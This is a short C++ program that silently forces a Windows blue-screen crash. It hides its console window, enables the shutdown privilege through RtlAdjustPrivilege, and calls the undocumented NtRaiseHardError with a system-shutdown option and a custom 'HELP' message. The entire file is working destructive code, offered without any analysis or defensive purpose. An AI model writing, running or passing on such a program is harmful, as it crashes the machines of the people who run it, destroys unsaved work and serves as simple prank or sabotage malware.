#include "RaiseHardError.h"

int main() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    auto hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == nullptr) {
        FreeLibrary(hNtdll);
        return ERROR_BAD_ENVIRONMENT;
    }

    auto RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    BOOLEAN enabled;
    if (RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &enabled) != 0) {
        FreeLibrary(hNtdll);
        return ERROR_ACCESS_DENIED;
    }

    auto NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
    FreeLibrary(hNtdll);
    
    //I don't know how to efficiently code C++, so the codes here are kinda messy. Please understand.
    ULONG_PTR parameters[1] = { 0 };
    parameters[0] = 0xC000021A; //It only defines BSOD code.
    ULONG_PTR parameterd[1] = { 0 };
    parameterd[0] = (ULONG_PTR)"HELP"; // This will set the custom text of the BSOD. but some codes will only work as most of them are hardcoded.
    HARDERROR_RESPONSE Response;
    return NtRaiseHardError(parameters[0], 1, 0, parameterd, OptionShutdownSystem, &Response);
}